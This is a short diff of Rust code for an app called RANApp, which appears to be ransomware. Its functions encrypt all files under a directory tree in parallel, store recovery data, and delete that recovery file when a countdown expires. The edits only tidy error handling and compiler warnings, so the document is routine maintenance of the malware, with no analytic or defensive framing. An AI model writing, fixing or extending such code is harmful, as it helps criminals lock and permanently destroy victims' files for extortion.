@@ -201,7 +201,7 @@ impl Default for RANApp {
 }
 impl RANApp {
     fn countdown_expired(&mut self) {
-        fs::remove_file(RECOVERY_INFO_PATH);
+        let _ = fs::remove_file(RECOVERY_INFO_PATH);
         self.show_expired_window = true;
     }
 }
@@ -377,7 +377,7 @@ impl eframe::App for RANApp {
                                                                 egui::ViewportCommand::Close,
                                                             );
                                                         }
-                                                        Err(e) => {}
+                                                        Err(_e) => {}
                                                     }
                                                 });
                                             } else {
@@ -545,7 +545,7 @@ fn run_encryption(
         .collect();
 
     entries.par_iter().for_each(|path| {
-        if let Err(e) = process_file(path, root_dir, &master_key, &meta) {}
+        if let Err(_e) = process_file(path, root_dir, &master_key, &meta) {}
     });
     let serialized = bincode::serialize(&meta)?;
     fs::write(recovery_info_path, &serialized)?;
@@ -680,7 +680,7 @@ fn run_decryption(recovery_info_path: &Path, root_dir: &Path, hex_key: &str) -> 
     .map(|e| e.into_path())
     .collect();
     entries.par_iter().for_each(|path| {
-        if let Err(e) = recover_file(path, root_dir, &master_key, &meta) {}
+        if let Err(_e) = recover_file(path, root_dir, &master_key, &meta) {}
     });
     Ok(())
 }
